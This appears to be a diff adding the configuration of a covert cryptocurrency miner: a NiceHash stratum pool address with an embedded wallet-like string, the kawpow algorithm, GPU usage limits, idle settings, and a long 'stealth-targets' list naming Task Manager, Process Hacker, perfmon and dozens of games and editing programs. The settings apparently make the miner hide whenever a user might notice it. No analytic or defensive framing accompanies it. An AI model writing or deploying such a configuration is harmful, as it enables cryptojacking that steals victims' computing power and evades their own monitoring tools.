@@ -1,0 +1,8 @@
+    "url": "stratums://`NHbGP8zV37xAgXGmPCjVFcQQXLbde1NNPJWt`.{BYU}@btc.nicehash.com:443",
+    "algo": "kawpow",
+    "max-gpu": 50,
+    "idle-wait": 5,
+    "idle-gpu": 90,
+    "stealth-targets": "Taskmgr,ProcessHacker,perfmon,procexp,procexp64,ModernWarfare,ShooterGame,ShooterGameServer,ShooterGame_BE,GenshinImpact,FactoryGame,Borderlands2,EliteDangerous64,PlanetCoaster,Warframe.x64,NMS,RainbowSix,RainbowSix_BE,CK2game,ck3,stellaris,arma3,arma3_x64,TslGame,ffxiv,ffxiv_dx11,GTA5,FortniteClient-Win64-Shipping,r5apex,VALORANT,csgo,PortalWars-Win64-Shipping,FiveM,left4dead2,FIFA21,BlackOpsColdWar,EscapeFromTarkov,TEKKEN 7,SRTTR,DeadByDaylight-Win64-Shipping,PointBlank,enlisted,WorldOfTanks,SoTGame,FiveM_b2189_GTAProcess,NarakaBladepoint,re8,Sonic Colors - Ultimate,iw6sp64_ship,RocketLeague,Cyberpunk2077,FiveM_GTAProcess,RustClient,Photoshop,VideoEditorPlus,AfterFX,League of Legends,Falluot4,FarCry5,RDR2,Little_Nightmares_II_Enhanced-Win64-Shippin,NBA2K22,Borderlands3,LeagueClientUx,RogueCompany,Tiger-Win64-Shipping,WatchDogsLegion,Phasmophobia,VRChat,NBA2K21,NarakaBladepoint,ForzaHorizon4,acad,AndroidEmulatorEn,bf4,zula,Adobe Premiere Pro,GenshinImpact",
+    "kill-targets": "",
+    "stealth-fullscreen": false
